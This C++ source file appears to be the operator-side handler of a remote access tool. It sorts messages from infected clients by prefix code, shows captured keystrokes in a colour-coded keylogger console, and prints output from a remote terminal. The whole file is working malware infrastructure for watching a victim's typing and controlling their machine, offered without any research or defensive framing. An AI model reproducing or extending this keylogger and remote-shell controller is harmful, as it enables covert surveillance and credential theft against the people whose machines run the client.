#include "answerFromClient.h"

void AnswerFromClient::coordinator()
{
	std::string prepos;
	prepos = _answer.substr(0, 2);
	_answer.erase(0, 2);

	if (prepos.compare("0$") == 0) //KEYLOGGER
	{
		if (_answer.length() == 1)
		{
			_keyloggerConsole.cprintf(CConsoleLoggerEx::COLOR_GREEN, _answer.c_str()); //letters
			_keyloggerConsole.cprintf(" ");
		}
		else
		{
			_keyloggerConsole.cprintf(CConsoleLoggerEx::COLOR_RED, _answer.c_str()); //symbols like [ENTER] etc.
			_keyloggerConsole.cprintf(" ");
		}
	}

	else if (prepos.compare("4$") == 0)
	{
		std::cout << "terminal: " << _answer << std::endl;
	}
	else if (prepos.compare("5$") == 0)
	{
		std::cout << _answer << std::endl;
	}
	else if (prepos.compare("$$") == 0)
	{
		if (DEBUG)
			std::cout << "Client Destructor!" << std::endl;
	}
}